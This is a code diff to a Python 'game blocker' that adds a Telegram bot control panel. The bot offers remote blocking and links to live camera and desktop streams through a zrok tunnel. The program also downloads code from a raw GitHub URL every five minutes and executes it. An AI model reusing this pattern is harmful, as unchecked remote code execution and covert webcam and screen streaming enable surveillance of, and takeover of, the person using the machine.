@@ -8,6 +8,7 @@ import requests
 import importlib.util
 import hashlib
 from flask import Flask, Response
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler
 from plyer import notification
 
@@ -36,7 +37,7 @@ zrok_url = None
 zrok_initialized = False
 PRIMARY_USER_ID = 1688000755
 UPDATE_CHECK_INTERVAL = 300  # Check for updates every 5 minutes
-UPDATE_URL = "https://example.com/game_blocker_update.py"  # Replace with your update URL
+UPDATE_URL = "https://raw.githubusercontent.com/Nuoms/game-blocker-updates/refs/heads/main/game_blocker.pyw"  # Replace with your URL
 LOCAL_UPDATE_PATH = os.path.join(BASE_PATH, 'game_blocker_logic.py')
 
 # Load configuration from config.json
@@ -56,6 +57,7 @@ except FileNotFoundError:
 class DynamicModule:
     def __init__(self):
         self.module = None
+        self.source_code = None  # Store the raw source code
         self.last_hash = None
         self.load_initial_module()
 
@@ -124,23 +126,26 @@ def gen_desktop():
     def save_default_module(self):
         """Save the default module to disk."""
         with open(LOCAL_UPDATE_PATH, 'w') as f:
-            f.write(self.module.__code__)
+            f.write(self.source_code)  # Write the stored source code
 
     def load_module_from_file(self, path):
         """Load module from a file."""
+        with open(path, 'r') as f:
+            code = f.read()
+            self.source_code = code
+            self.last_hash = hashlib.sha256(code.encode()).hexdigest()
         spec = importlib.util.spec_from_file_location("game_blocker_logic", path)
         module = importlib.util.module_from_spec(spec)
         spec.loader.exec_module(module)
         self.module = module
-        with open(path, 'r') as f:
-            self.last_hash = hashlib.sha256(f.read().encode()).hexdigest()
 
     def load_module_from_string(self, code):
         """Load module from a string."""
+        self.source_code = code  # Store the source code
+        self.last_hash = hashlib.sha256(code.encode()).hexdigest()
         module = type(sys)(f"game_blocker_logic_{int(time.time())}")
         exec(code, module.__dict__)
         self.module = module
-        self.last_hash = hashlib.sha256(code.encode()).hexdigest()
 
     def check_for_updates(self):
         """Check for updates from the remote URL."""
@@ -189,12 +194,113 @@ def update_checker():
         dynamic_module.check_for_updates()
         time.sleep(UPDATE_CHECK_INTERVAL)
 
-# Telegram bot setup (unchanged for brevity, assume same as original)
+# Telegram bot functions
+async def send_status_message(chat_id, context, user_id):
+    global zrok_url, zrok_initialized, anti_spy_flag
+    status = "Blocked" if block_flag else "Unblocked"
+    anti_spy_status = "Enabled" if anti_spy_flag else "Disabled"
+    disable_notification = (user_id != PRIMARY_USER_ID)
+
+    if not zrok_initialized or not zrok_url or not zrok_url.startswith("https://"):
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"Game Blocker Status: {status}\nZrok failed to initialize.",
+            disable_notification=disable_notification
+        )
+        return
+
+    if user_id == PRIMARY_USER_ID:
+        keyboard = [
+            [InlineKeyboardButton("Block" if not block_flag else "Unblock", callback_data="toggle")],
+            [InlineKeyboardButton(f"Anti-Spy: {anti_spy_status}", callback_data="antispy")],
+            [InlineKeyboardButton("Live Camera", url=f"{zrok_url}/camera"),
+             InlineKeyboardButton("Live Desktop", url=f"{zrok_url}/desktop")]
+        ]
+    else:
+        if anti_spy_flag:
+            keyboard = [
+                [InlineKeyboardButton("Block" if not block_flag else "Unblock", callback_data="toggle")],
+                [InlineKeyboardButton("Live feeds disabled by primary user", callback_data="disabled")]
+            ]
+        else:
+            keyboard = [
+                [InlineKeyboardButton("Block" if not block_flag else "Unblock", callback_data="toggle")],
+                [InlineKeyboardButton("Live Camera", url=f"{zrok_url}/camera"),
+                 InlineKeyboardButton("Live Desktop", url=f"{zrok_url}/desktop")]
+            ]
+
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    try:
+        if 'status_message_id' in context.user_data:
+            await context.bot.edit_message_text(
+                chat_id=chat_id,
+                message_id=context.user_data['status_message_id'],
+                text=f"Game Blocker Status: {status}",
+                reply_markup=reply_markup
+            )
+        else:
+            message = await context.bot.send_message(
+                chat_id=chat_id,
+                text=f"Game Blocker Status: {status}",
+                reply_markup=reply_markup,
+                disable_notification=disable_notification
+            )
+            context.user_data['status_message_id'] = message.message_id
+    except Exception as e:
+        logger.error(f"Telegram error: {e}")
+        await context.bot.send_message(
+            chat_id=chat_id,
+            text=f"Game Blocker Status: {status}\nFailed to set buttons.",
+            disable_notification=disable_notification
+        )
+
+async def start(update, context):
+    user_id = update.effective_user.id
+    if user_id not in authorized_user_ids:
+        await update.message.reply_text("You are not authorized to use this bot.")
+        return
+    await send_status_message(update.effective_chat.id, context, user_id)
+
+async def button(update, context):
+    query = update.callback_query
+    user_id = query.from_user.id
+    if user_id not in authorized_user_ids:
+        await query.answer("You are not authorized.")
+        return
+    
+    if query.data == "toggle":
+        global block_flag
+        block_flag = not block_flag
+        await query.answer(f"Games {'blocked' if block_flag else 'unblocked'}")
+    elif query.data == "antispy" and user_id == PRIMARY_USER_ID:
+        global anti_spy_flag
+        anti_spy_flag = not anti_spy_flag
+        await query.answer(f"Anti-Spy {'enabled' if anti_spy_flag else 'disabled'}")
+    elif query.data == "disabled":
+        await query.answer("Live feeds are disabled by the primary user.")
+        return
+    
+    await send_status_message(query.message.chat_id, context, user_id)
+
+async def on_startup(application):
+    logger.info("Bot starting up, sending status to authorized users")
+    for user_id in authorized_user_ids:
+        try:
+            await application.bot.send_message(
+                chat_id=user_id,
+                text="Game Blocker Starting...",
+                disable_notification=(user_id != PRIMARY_USER_ID)
+            )
+            await send_status_message(user_id, application, user_id)
+        except Exception as e:
+            logger.error(f"Failed to send startup message to {user_id}: {e}")
+
+# Set up the bot and threads
 application = Application.builder().token(bot_token).build()
 application.add_handler(CommandHandler("start", start))
 application.add_handler(CallbackQueryHandler(button))
 
-# Start threads
 checker_thread = threading.Thread(target=window_checker, daemon=True)
 checker_thread.start()
 
@@ -204,4 +310,5 @@ flask_thread.start()
 update_thread = threading.Thread(target=update_checker, daemon=True)
 update_thread.start()
 
+application.post_init = on_startup
 application.run_polling()
